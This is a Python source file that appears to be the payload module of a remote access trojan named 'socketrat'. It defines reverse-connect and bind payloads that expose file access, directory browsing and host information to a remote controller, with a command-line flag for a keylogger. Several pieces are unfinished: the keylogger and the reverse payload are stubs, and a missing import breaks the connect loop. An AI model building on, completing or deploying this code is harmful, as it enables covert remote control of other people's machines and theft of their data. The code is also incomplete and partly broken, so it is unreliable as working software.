# -*- coding: utf-8 -*-

import platform
import socket
import socketserver
import sys

from .. import connection
from .. import rpc

from . import *


class TCPClient:

    def __init__(self, addr):
        self.addr = addr
        self.retry_interval = 1

    def connect_forever(self):
        while True:
            sock = socket.create_connection(self.addr)
            time.sleep(self.retry_interval)


class PayloadRPCDispatcher(rpc.RPCHandler):
    ''' Mix-in class that dispatches RPC requests. '''

    def rpc_dir(self):
        return list(self._functions)

    def rpc_echo(self, s):
        return s

    def register_file_service(self, mode):
        pass

    def register_keylogger(self):
        pass


class PayloadRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        self.server.handle_socket(self.request)


class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):

    def __init__(self, addr, requestHandler=PayloadRequestHandler,
            logRequests=True, allow_none=False, encoding=None,
            bind_and_activate=True, use_builtin_types=False):
        self.logRequests = logRequests

        #PayloadRPCDispatcher.__init__(self, allow_none, encoding, use_builtin_types)
        PayloadRPCDispatcher.__init__(self)
        socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)


class TCPReversePayload(TCPClient, PayloadRPCDispatcher):
    
    def __init__(self, addr):
        pass


class FileService(FileOpener, FileReader, FileWriter):
    pass


def _linux_connect(args):
    host, port = addr = args.host, args.port

    with TCPReversePayload(addr) as payload:
        funcs = [
                get_username,
                get_hostname,
                get_platform,
                list_dir,
                change_dir,
                get_current_dir,
                get_file_size,
                uname,
        ]
        for f in funcs:
            payload.register_function(f)
        payload.register_instance(FileService())
        try:
            payload.connect_forever()
        except connection.ConnectionClosed:
            pass


def _linux_listen(args):
    print(args)
    print('listening')


def _windows_main(args):
    raise NotImplementedError


def _linux_main(args):
    import argparse

    parser = argparse.ArgumentParser(
            prog='socketrat.payload',
            prefix_chars='-+',
    )
    payload_group = parser.add_argument_group('payload arguments')
    payload_group.add_argument('-cd',
            help='Turn off change directory',
            action='store_false',
    )
    payload_group.add_argument('+kl',
            help='Turn on keylogger',
            action='store_true',
    )

    subparsers = parser.add_subparsers(
            dest='command',
            help='Choose from the following commands:',
            metavar='command',
    )
    subparsers.required = True

    connect_parser = subparsers.add_parser('connect',
            help='Connect to a socketrat server [reverse payload]'
    )
    connect_parser.set_defaults(func=_linux_connect)
    connect_parser.add_argument('host',
            help='Specify alternate hostname or IP address '
                 '[default: localhost]',
            default='localhost',
            nargs='?',
    )
    connect_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    listen_parser = subparsers.add_parser('listen',
            help='Listen for connections from a socketrat server [bind payload]',
    )
    listen_parser.set_defaults(func=_linux_listen)
    listen_parser.add_argument('--bind', '-b',
            help='Specify alternate bind address [default: all interfaces]',
            metavar='ADDRESS',
            default='0.0.0.0',
    )
    listen_parser.add_argument('port',
            help='Specify alternate port [default: 8000]',
            default=8000,
            nargs='?',
    )

    args = parser.parse_args(args)
    args.func(args)


if platform.system() == 'Windows':
    main = _windows_main
elif platform.system() == 'Linux':
    main = _linux_main
else:
    def main(*args, **kwargs):
        raise NotImplementedError


if __name__ == '__main__':
    import sys

    args = sys.argv[1:]
    try:
        main(args)
    except NotImplementedError:
        print('*** Platform not supported: {}'.format(platform.system()))

